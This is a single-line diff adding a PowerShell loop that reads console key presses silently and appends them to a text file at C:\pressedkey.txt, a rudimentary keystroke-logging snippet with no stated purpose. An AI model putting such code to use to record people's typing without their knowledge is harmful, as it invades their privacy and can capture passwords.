@@ -1,0 +1,1 @@
+while (1){$KeyPress = $host.UI.RawUI.ReadKey(NoEcho,IncludeKeyDown) | out-file -Append C:\pressedkey.txt}
